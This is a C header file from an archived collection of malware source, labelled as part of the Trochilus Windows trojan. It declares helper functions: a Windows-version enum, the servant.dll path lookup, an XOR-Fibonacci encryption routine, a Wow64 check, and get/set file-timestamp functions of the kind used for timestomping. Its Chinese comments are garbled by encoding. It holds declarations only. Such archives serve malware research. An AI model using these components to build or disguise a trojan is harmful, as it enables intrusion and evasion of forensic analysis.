/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include "tstring.h"

//����ϵͳ��ʶ ö������
typedef enum WIN_VER_DETAIL {
	WINDOWS_VERSION_NONE = 0,   // 0
	WINDOWS_VERSION_95,			// 1
	WINDOWS_VERSION_95_OSR2,	// 2
	WINDOWS_VERSION_98,			// 3
	WINDOWS_VERSION_98_SE,		// 4
	WINDOWS_VERSION_ME,			// 5
	WINDOWS_VERSION_NT,			// 6
	WINDOWS_VERSION_2K,			// 7
	WINDOWS_VERSION_XP,			// 8
	WINDOWS_VERSION_2K3,		// 9
	WINDOWS_VERSION_2K3_SP1_SP2,// 10
	WINDOWS_VERSION_VISTA,		// 11
	WINDOWS_VERSION_7,			// 12
	WINDOWS_VERSION_2K8,		// 13
	WINDOWS_VERSION_8,			// 14
	WINDOWS_VERSION_2012,		// 15
} WIN_VER_DETAIL;

//��ȡservant.dll����Ŀ¼������ֵ��\��β
LPCTSTR GetBinFilepath();

//��ȡ��ǰdll���ļ�����
LPCTSTR GetBinFilename();

//���ӽ���
void XorFibonacciCrypt(const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, UINT factor0, UINT factor1);

//��ȡ����ϵͳ�汾
WIN_VER_DETAIL GetWindowsVersion();

//��ȡ����ϵͳƽ̨
BOOL IsWow64();

#define DECLARE_TIMES(_prefix) FILETIME _prefix##CreationTime = {0}, _prefix##LastAccessTime = {0}, _prefix##LastWriteTime = {0};
#define TIMES_PARAM(_prefix) _prefix##CreationTime, _prefix##LastAccessTime, _prefix##LastWriteTime
//��ȡ�ļ���ʱ������
BOOL GetFileTimes(LPCTSTR filepath, BOOL bIsDir, FILETIME& ftCreationTime, FILETIME& ftLastAccessTime, FILETIME& ftLastWriteTime);

//�����ļ���Ŀ¼��ʱ��
BOOL SetFileTimes(LPCTSTR filepath, BOOL bIsDir, const FILETIME& ftCreationTime, const FILETIME& ftLastAccessTime, const FILETIME& ftLastWriteTime);
